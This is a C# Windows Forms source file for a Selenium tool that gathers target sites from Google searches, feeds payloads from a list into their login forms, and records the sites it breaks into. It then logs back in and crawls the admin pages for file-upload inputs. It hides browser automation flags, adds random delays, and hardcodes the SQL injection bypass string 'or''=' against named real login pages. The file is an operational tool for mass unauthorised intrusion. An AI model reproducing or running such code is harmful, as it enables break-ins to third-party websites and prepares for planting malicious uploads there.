using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Linq;

namespace ADHWithSelenium
{
    public partial class Home : Form
    {
        bool isStop = false;
        Random random = new Random();
        public delegate void MyDelegate(string url, string msg, string progress);
        private void UpdateLabel(string url, string msg, string progress)
        {
            Invoke(new Action(() => {
                label10.Text = (url != "") ? url : label10.Text;
                label11.Text = (msg != "") ? msg : label11.Text;
                label12.Text = (progress != "") ? progress : label12.Text;
            })); 
        }
        public Home()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
            comboBox3.SelectedIndex = 0;
            comboBox4.SelectedIndex = 0;
            listView1.CheckBoxes = true;
        }



        private async void CrawlUrls(object sender, EventArgs e)
        {          
            listView1.Items.Clear();
            ResetProgress();
            MyDelegate myDelegate = new MyDelegate(UpdateLabel);
            
            if (textBox1.Text != "")
            {
                IWebDriver driver = (comboBox3.Text == "Google Chrome") ? (IWebDriver)CreateChromeDriver(false) : (IWebDriver)CreateFirefoxDriver(false);

                //int screenWidth = int.Parse(SystemParameters.FullPrimaryScreenWidth.ToString());
                //int screenHeight = int.Parse(SystemParameters.FullPrimaryScreenHeight.ToString());
                //driver.Manage().Window.Size = new System.Drawing.Size(screenWidth, screenHeight);
                //driver.Manage().Window.Maximize();

                string searchQuery = textBox1.Text;
                bool isSuccessful = Navigate(driver, "https://www.google.com/search?q=" + searchQuery);

                int pages = 1;
                int noOfPages = int.Parse(comboBox1.Text);

                List<string> urls = new List<string>();
                int urlCounter = 1;
                while (pages <= noOfPages)
                {
                    if (driver.PageSource.Contains("Our systems have detected unusual traffic from your computer network"))
                    {
                        MessageBox.Show("Please manually resolve recaptcha and press enter");
                    }
                    var urlElements = driver.FindElements(By.ClassName("yuRUbf"));
                    foreach (var element in urlElements)
                    {
                        await Task.Run(() => {
                            string url = element.FindElement(By.TagName("a")).GetAttribute("href");
                            if(url.Contains("https:"))
                            {
                                urls.Add(url);
                                Invoke(new Action(() => {
                                    listView1.Items.Add(url);
                                }));
                                myDelegate.DynamicInvoke(url, "Found Websites", urlCounter.ToString());
                                urlCounter++;
                            }  
                        }); 
                        
                    }
                    pages++;
                    try
                    {
                        if (pages <= noOfPages)
                            driver.FindElement(By.CssSelector("#pnnext>span:nth-child(2)")).Click();
                    }
                    catch (Exception)
                    {
                        break;
                    }
                }
                driver.Dispose();
            }
        }
        private void button2_Click(object sender, EventArgs e)
        {
            if (listView1.CheckedItems.Count > 0)
            {
                foreach (ListViewItem item in listView1.CheckedItems)
                {
                    item.Remove();
                }
            }
            label11.Text = listView1.Items.Count.ToString();
        }


        private async void HackDomain(object sender, EventArgs e)
        {
            ResetProgress();
            isStop = false;
            MyDelegate myDelegate = new MyDelegate(UpdateLabel);

            listView2.Items.Clear();
            string[] urls = File.ReadAllLines(label5.Text);
            string[] payloads = File.ReadAllLines(label4.Text);

            IWebDriver driver = (comboBox2.Text == "Google Chrome") ? (IWebDriver)CreateChromeDriver(checkBox1.Checked) : (IWebDriver)CreateFirefoxDriver(checkBox1.Checked);
     
            foreach (string url in urls)
            {
                IJavaScriptExecutor scriptExecutor = (IJavaScriptExecutor)driver;
                scriptExecutor.ExecuteScript("window.open()");
            }
            int lwCount = 0;
            int attempts = 0;
            myDelegate.DynamicInvoke("","Attempts/Total Attempts  Hacked", attempts.ToString() + "/" + urls.Length * payloads.Length + "  0");
            foreach (string payload in payloads)
            {
                int counter = 0;
                foreach (string url in urls)
                {
                    if (isStop) {
                        driver.Dispose();
                        return;
                    }
                    attempts++;
                    try
                    {
                        await Task.Run(() => {

                            try
                            {
                                driver.SwitchTo().Window(driver.WindowHandles[counter]);
                                Navigate(driver, url);
                            }
                            catch (Exception ex)
                            {
                                if (ex.Message.Contains("not reachable"))
                                {
                                    driver.Dispose();
                                    return;
                                }
                            }
                        });


                        //Login
                        Login(driver,url,payload);

                        try{driver.SwitchTo().Alert().Dismiss();}catch (Exception){}


                        try
                        {
                            string currentUrl = driver.Url;
                            if (!currentUrl.Contains("login.php") && !currentUrl.ToLower().Contains("error"))
                            {
                                string domain = currentUrl.Substring(8,10);
                                bool isAlreadyExist = false;
                                foreach(ListViewItem item in listView2.Items)
                                {
                                    if(item.SubItems[0].Text.Contains(domain))
                                    {
                                        listView2.Items[item.Index].SubItems[1].Text += "|"+payload;                                           
                                        isAlreadyExist = true;
                                    }
                                }
                                if(!isAlreadyExist)
                                {
                                    listView2.Items.Add(url);
                                    listView2.Items[lwCount].SubItems.Add(payload);
                                    lwCount++;
                                }
                            }
                        }
                        catch (Exception) { }

                        myDelegate.DynamicInvoke(url, "Attempts/Total Attempts  Hacked", attempts.ToString()+"/"+urls.Length*payloads.Length+"  " + listView2.Items.Count.ToString());
                    
                    }
                    catch (Exception) { continue; }
                    counter++;
                }
            }
            driver.Dispose();
        }        
        private async void FindUploadPoints(object sender, EventArgs e)
        {
            ResetProgress();
            isStop = false;
            await Task.Run(() => {
                IWebDriver chromeDriver = CreateChromeDriver(checkBox2.Checked);
                IWebDriver firefoxDriver = CreateFirefoxDriver(checkBox2.Checked);

                Invoke(new Action(() => { 
                    listView3.Items.Clear();
                    label10.Text = "";
                    label11.Text = "";
                })); 

                string[] domains = File.ReadAllText(label8.Text).Trim().Split('\n');
                int listCounter = 0;
                MyDelegate myDelegate = new MyDelegate(UpdateLabel);

                foreach (string data in domains)
                {
                    if (isStop)
                    {
                        chromeDriver.Dispose();
                        firefoxDriver.Dispose();
                        return;
                    }
                    string[] line = data.Split(new [] { "|" }, 2, StringSplitOptions.None);
                    Uri uri = new Uri(line[0].Trim());
                    string domain = uri.Scheme + "://" + uri.Host;
                    string loginUrl = line[0].Trim();
                    string payload = line[1].Trim().Split('|')[0];
                    myDelegate.DynamicInvoke(domain, "Logging In","");
                    Login(chromeDriver, loginUrl, payload);
                    string homePage = (FindUploadPointAtHomePage(chromeDriver)) ? chromeDriver.Url : null;
                    Login(firefoxDriver, loginUrl, payload);
                    myDelegate.DynamicInvoke(domain, "Logged In","");

                    List<string> urls = FindAllUrls(chromeDriver, firefoxDriver, domain).Distinct().ToList();
                    myDelegate.DynamicInvoke(domain, "Removing duplicate URLs","");
                    Thread.Sleep(3000);
                    myDelegate.DynamicInvoke(domain, "Unique URLs", urls.Count().ToString());
                    Thread.Sleep(3000);
                    Invoke(new Action(() => {
                        ListViewItem item = new ListViewItem();
                        item.Text = domain;
                        item.SubItems.Add(urls.Count.ToString());
                        item.SubItems.Add("");
                        listView3.Items.Add(item);

                        if(homePage != null)
                        {
                            listView3.Items[listCounter].SubItems[2].Text = homePage;
                        } 
                    }));

                    //Find upload point from all urls
                    int urlCounter = 0;
                    foreach (string url in urls)
                    {
                        if (isStop)
                        {
                            chromeDriver.Dispose();
                            firefoxDriver.Dispose();    
                            return;
                        }
                        Thread.Sleep(random.Next(5, 50) * 100);
                        myDelegate.DynamicInvoke(url, "Finding Upload Points", (urlCounter + 1).ToString() + "/" + urls.Count.ToString());
                        if (urlCounter % 2 == 0)
                        {
                            //chrome
                            try
                            {                             
                                Navigate(chromeDriver,url);
                                IWebElement webElement = chromeDriver.FindElement(By.CssSelector("input[type = file]"));
                                Invoke(new Action(() =>
                                {
                                    string txt = listView3.Items[listCounter].SubItems[2].Text;
                                    listView3.Items[listCounter].SubItems[2].Text = txt == "" ? url : txt += "|" + url;
                                }));
                                urlCounter++;
                            }
                            catch (Exception)
                            {
                                urlCounter++;
                                continue;
                            }
                        }
                        else
                        {
                            //firefox
                            try
                            {
                                Navigate(firefoxDriver,url);
                                IWebElement webElement = firefoxDriver.FindElement(By.CssSelector("input[type = file]"));
                                Invoke(new Action(() => listView3.Items[listCounter].SubItems.Add(url)));
                                urlCounter++;
                            }
                            catch (Exception)
                            {
                                urlCounter++;
                                continue;
                            }
                        }
                    }
                    listCounter++;
                }

                chromeDriver.Dispose();
                firefoxDriver.Dispose();
            });   
        }    



        private void Login(IWebDriver driver, string loginUrl, string payload)
        {
            bool isSuccessful = Navigate(driver,loginUrl);
            if (!isSuccessful) { return; }
            Thread.Sleep(2000);
            //USER ID/EMAIL/USERNAME
            try
            {
                var element = driver.FindElements(By.CssSelector("input"));
                int i = 0;
                foreach (var item in element)
                {
                    string type = item.GetAttribute("type");
                    if (type == "text" || type == "username" || type == "email")
                    {
                        if (element[i + 1].GetAttribute("type") == "password")
                        {
                            item.SendKeys(payload);
                            goto PASSWORD;
                        }
                    }
                    i++;
                }
            }
            catch (Exception) { }

        //PASSWORD
        PASSWORD:
            driver.FindElement(By.CssSelector("input[type = password]")).Clear();
            driver.FindElement(By.CssSelector("input[type = password]")).SendKeys(payload);

            Thread.Sleep(700);

            //SUBMIT/BUTTON
            try
            {
                var elements = driver.FindElements(By.CssSelector("input"));
                int i = 0;
                foreach (var item in elements)
                {
                    try
                    {
                        string type = item.GetAttribute("type");
                        if (type == "submit" || type == "button")
                        {
                            if (elements[i - 1].GetAttribute("type") == "password")
                            {
                                item.Click();
                            }
                            if (elements[i - 1].GetAttribute("type") == "checkbox" && elements[i - 2].GetAttribute("type") == "password")
                            {
                                item.Click();
                            }
                        }
                    }
                    catch (Exception)
                    {
                        continue;
                    }
                    i++;
                }
            }
            catch (Exception)
            {
                goto SUBMIT2;
            }

        SUBMIT2:
            try
            {
                var elements = driver.FindElements(By.CssSelector("button"));
                elements[elements.Count - 1].Click();
            }
            catch (Exception) { }
        }
        private bool FindUploadPointAtHomePage(IWebDriver driver)
        {
            try
            {
                IWebElement webElement = driver.FindElement(By.CssSelector("input[type = file]"));
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
        private List<string> FindAllUrls(IWebDriver chromeDriver, IWebDriver firefoxDriver, string domain)
        {
            //Find all admin urls
            List<string> urls = new List<string>();
            MyDelegate myDelegate = new MyDelegate(UpdateLabel);
            Thread.Sleep(5000);
            var links = firefoxDriver.FindElements(By.TagName("a"));
            while(links.Count == 0)
            {
                Thread.Sleep(5000);
                links = firefoxDriver.FindElements(By.TagName("a"));
            }
            //Websire Creawl level 1
            foreach (var link in links)
            {
                string l = link.GetAttribute("href");
                var href = l.Contains("#") ? l : l.Replace("#","");
                href = (href.LastIndexOf('/') == href.Length - 1) ? href.Remove(href.LastIndexOf('/'), 1) : href;
                if (href != domain && !href.Contains("logout") && !href.Contains("signout") && !href.Contains("login"))
                {
                    bool isAlreadyExist = false;
                    foreach(string url in urls)
                    {
                        if(url == href)
                        {
                            isAlreadyExist = true;
                            break;
                        }
                    }  
                    if(!isAlreadyExist)
                    {
                        urls.Add(href);
                        myDelegate.DynamicInvoke(domain, "Found Admin URLs", urls.Count.ToString());
                    }
                }
            }
            //Website Crawl Level 2
            int websiteCrawlLevel = 0;
            Invoke(new Action(() => websiteCrawlLevel = int.Parse(comboBox4.Text)));
            if(websiteCrawlLevel == 2)
            {
                int urlsAtHomeCount = urls.Count();
                int count = 0;
                int switching = 0;
                while (count < urlsAtHomeCount)
                {
                    if (switching % 2 == 0)
                    {
                        urls.AddRange(FindDeepUrls(firefoxDriver, domain, urls.ElementAt(count)));
                        switching++;
                    }
                    else
                    {
                        urls.AddRange(FindDeepUrls(chromeDriver, domain, urls.ElementAt(count)));
                        switching++;
                    }
                    myDelegate.DynamicInvoke(domain, "Found Admin URLs", urls.Count.ToString());
                    count++;
                }
            }
            //Website Crawl Level 3
            int websiteCrawlLevel3 = 0;
            Invoke(new Action(() => websiteCrawlLevel3 = int.Parse(comboBox4.Text)));
            if (websiteCrawlLevel == 3)
            {
                int urlsAtHomeCount3 = urls.Count();
                int count3 = 0;
                int switching3 = 0;
                while (count3 < urlsAtHomeCount3)
                {
                    if (switching3 % 2 == 0)
                    {
                        urls.AddRange(FindDeepUrls(firefoxDriver, domain, urls.ElementAt(count3)));
                        switching3++;
                    }
                    else
                    {
                        urls.AddRange(FindDeepUrls(chromeDriver, domain, urls.ElementAt(count3)));
                        switching3++;
                    }
                    myDelegate.DynamicInvoke(domain, "Found Admin URLs", urls.Count.ToString());
                    count3++;
                }
            }
            return urls;
        }
        private List<string> FindDeepUrls(IWebDriver driver, string domain, string currentUrl)
        {
            Navigate(driver, currentUrl);
            List<string> urls = new List<string>();
            var links = driver.FindElements(By.TagName("a"));
            foreach (var link in links)
            {
                string l = link.GetAttribute("href");
                if(l != null)
                {
                    var href = l.Contains("#") ? l : l.Replace("#", "");
                    href = (href.LastIndexOf('/') == href.Length - 1) ? href.Remove(href.LastIndexOf('/'), 1) : href;
                    if (href != domain && !href.Contains("logout") && !href.Contains("signout") && !href.Contains("login"))
                    {
                        bool isAlreadyExist = false;
                        foreach (string url in urls)
                        {
                            if (url == href)
                            {
                                isAlreadyExist = true;
                                break;
                            }
                        }
                        if (!isAlreadyExist)
                        {
                            urls.Add(href);
                        }
                    }
                }  
            }
            return urls;
        }


        private void Export(object sender, EventArgs e)
        {
            ListView listView = (((Button)sender).Name == button3.Name) ? listView1 :
                                (((Button)sender).Name == button7.Name) ? listView2 :
                                (((Button)sender).Name == button12.Name) ? listView3 :
                                null;

            SaveFileDialog saveFileDialog = new SaveFileDialog();
            DialogResult result = saveFileDialog.ShowDialog();
            if (result == DialogResult.OK)
            {
                string fileName = saveFileDialog.FileName;

                FileStream fileStream = new FileStream(fileName + ".txt", FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter writer = new StreamWriter(fileStream);
                if (listView == listView1)
                {
                    foreach (ListViewItem item in listView.Items)
                    {
                        writer.WriteLine(item.Text);
                        writer.Flush();
                        fileStream.Flush();
                    }
                }
                else if (listView == listView2)
                {
                    foreach (ListViewItem item in listView.Items)
                    {
                        writer.WriteLine(item.Text + "|" + item.SubItems[1].Text);
                        writer.Flush();
                        fileStream.Flush();
                    }
                }
                else if (listView == listView3)
                {
                    foreach (ListViewItem item in listView.Items)
                    {
                        writer.WriteLine(item.Text);
                        string[] urlsWithUploadPoints = item.SubItems[2].Text.Split('|');
                        foreach (string url in urlsWithUploadPoints)
                        {
                            writer.WriteLine("     " + url);
                        }
                        writer.Flush();
                        fileStream.Flush();
                    }
                }
                writer.Close();
                fileStream.Close();
            }
        }
        private void Import(object sender, EventArgs e)
        {
            Label label = (((Button)sender).Name == button4.Name) ? label4 :
                                (((Button)sender).Name == button6.Name) ? label5 :
                                (((Button)sender).Name == button9.Name) ? label8 :
                                null;
            OpenFileDialog openFileDialog = new OpenFileDialog();
            DialogResult dialogResult = openFileDialog.ShowDialog();
            if (dialogResult == DialogResult.OK)
            {
                string fileName = openFileDialog.FileName;
                label.Text = fileName;
            }
        }

        private bool Navigate(IWebDriver driver, string url)
        {
            int i = 0;
            while (i < 5)
            {
                try
                {
                    driver.Navigate().GoToUrl(url);
                    break;
                }
                catch (Exception)
                {
                    i++;
                    continue;
                }
            }
            return i < 5 ? true : false;
        }
        public void KillProcesses()
        {
            Process[] driverProcesses = Process.GetProcessesByName("chrome");
            Process[] firefoxDriverProcesses = Process.GetProcessesByName("firefox");
            foreach (var driverProcess in driverProcesses)
            {
                driverProcess.Kill();
            }
            foreach (var firefoxDriverProcess in firefoxDriverProcesses)
            {
                firefoxDriverProcess.Kill();
            }
        }


        public ChromeDriver CreateChromeDriver(bool hideBrowser)
        {
            ChromeOptions options = new ChromeOptions();
            if (hideBrowser)
            {
                options.AddArgument("--headless");
            }
            options.AddArgument("--no-sandbox");
            options.AddExcludedArgument("enable-automation");
            //options.AddAdditionalCapability("useAutomationExtension", false);
            ChromeDriverService service = ChromeDriverService.CreateDefaultService();
            service.HideCommandPromptWindow = true;
            //TimeSpan.FromSeconds is the max time for request to timeout
            ChromeDriver driver = new ChromeDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 100)));
            driver.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(50);
            //int screenWidth = int.Parse(SystemParameters.FullPrimaryScreenWidth.ToString());
            //driver.Manage().Window.Size = new System.Drawing.Size(screenWidth, 100);
            //driver.Manage().Window.Position = new System.Drawing.Point(0, 0);
            if (hideBrowser)
            {
                driver.Manage().Window.Minimize();
            }
            else
            {
                driver.Manage().Window.Maximize();
            }
            return driver;
        }
        public FirefoxDriver CreateFirefoxDriver(bool hideBrowser)
        {
            FirefoxOptions options = new FirefoxOptions();
            if (hideBrowser)
            {
                options.AddArgument("--headless");  
            }
            options.AddArgument("--no-sandbox");
            FirefoxDriverService service = FirefoxDriverService.CreateDefaultService();
            service.HideCommandPromptWindow = true;
            FirefoxDriver driver = new FirefoxDriver(service, options, TimeSpan.FromSeconds(random.Next(40, 100)));
            driver.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(50);
            //int screenWidth = int.Parse(SystemParameters.FullPrimaryScreenWidth.ToString());
            //driver.Manage().Window.Size = new System.Drawing.Size(screenWidth, 100);
            //int screenHeight = int.Parse(SystemParameters.FullPrimaryScreenHeight.ToString());
            //driver.Manage().Window.Position = new System.Drawing.Point(0, screenHeight-80);
            if (hideBrowser)
            {
                driver.Manage().Window.Minimize();
            }
            else
            {
                driver.Manage().Window.Maximize();
            }         
            return driver;
        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            ResetProgress();
        }
        private void ResetProgress()
        {
            label10.Text = "";
            label11.Text = "";
            label12.Text = "";
        }
        private void Stop(object sender, EventArgs e)
        {
            isStop = true;
        }

        



        private async void LoginByHttpRequest(string loginUrl, string payload)
        {
            //var client = new RestClient("https://resulthost.in/demo/online-certificate-verification/login.php");
            //client.Timeout = -1;
            //var request = new RestRequest(Method.POST);
            //request.AddHeader("Cookie", "PHPSESSID=9096404d6efa23226fc59700b9f29291");
            //request.AlwaysMultipartFormData = true;
            //request.AddParameter("username", "'or''='");
            //request.AddParameter("password", "'or''='");
            //IRestResponse response = client.Execute(request);
            //Console.WriteLine(response.Content);

            string url = "https://resulthost.in/demo/online-certificate-verification/login.php";
            string url1 = "https://nidj.ac.in/studentcorner/logincheck.php";
            var data = new Dictionary<string, string>
            {
                {"username", "'or''='"},
                {"password", "'or''='"}
            };
            var client = new HttpClient();
            var res = await client.PostAsync(url1, new FormUrlEncodedContent(data));
            var content = await res.Content.ReadAsStringAsync();

            var loginModel = new LoginModel { Username = "'or''='", Password = "'or''='" };
            //var json = JsonConvert.SerializeObject(loginModel);
            //var formData = new StringContent(json.ToLower(), Encoding.UTF8, "application/json");
            //HttpClient client = new HttpClient();
            //HttpRequestMessage request = new HttpRequestMessage();
            //request.Method = HttpMethod.Post;
            //request.RequestUri = new Uri();
            //request.Content = formData;
            //request.Content.Headers.ContentLength = 500;
            //request.Headers.Add("content-length", "300");
            
            
            //var response = await client.SendAsync(request);
            //var result = await response.Content.ReadAsStringAsync();
        }

    }
}
